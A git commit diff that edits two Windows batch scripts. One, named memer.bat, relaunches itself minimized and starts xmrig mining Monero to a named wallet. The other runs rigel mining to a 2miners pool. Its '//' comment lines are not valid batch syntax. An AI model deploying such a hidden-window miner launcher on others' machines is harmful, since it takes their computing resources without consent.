58b43e1d8acccd4552dbb40f4674b805e2c1c70e
JJCgits <jjchiyezhan@gmail.com>
2024-04-16 17:51:57 -0400

    Fixxed Issue

--- memer.bat
+++ memer.bat
@@ -1,3 +1,6 @@
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-    cd rigel-1.15.1-win
-    start /min start.bat
+    //cd rigel-1.15.1-win
+    cd xmrig-6.8.1
+    xmrig.exe --coin=XMR -o solo-xmr.2miners.com:4444 -u 49nWjdPoicnBRM4NtvWHtFSbPmFT4FfSUMSuxbFZUc6SPqo8PE7yvAy6ihk4MGaaNR1r9vrewPmuS88KPCRXEXWvV9svrLs.JJCHEEZIT -p x
+    pause
+    //start /min start.bat
--- rigel-1.15.1-win/start.bat
+++ rigel-1.15.1-win/start.bat
@@ -1,3 +1,2 @@
-
 rigel.exe -a pyrinhash -o stratum+tcp://pyi.2miners.com:2121 -u qrywgsf0dw72wd4d7r6n36uc2cx3y0d9fgasuxxrvvyhcc37748q6a3f39hf0 -w JJCheezitPYI
 pause
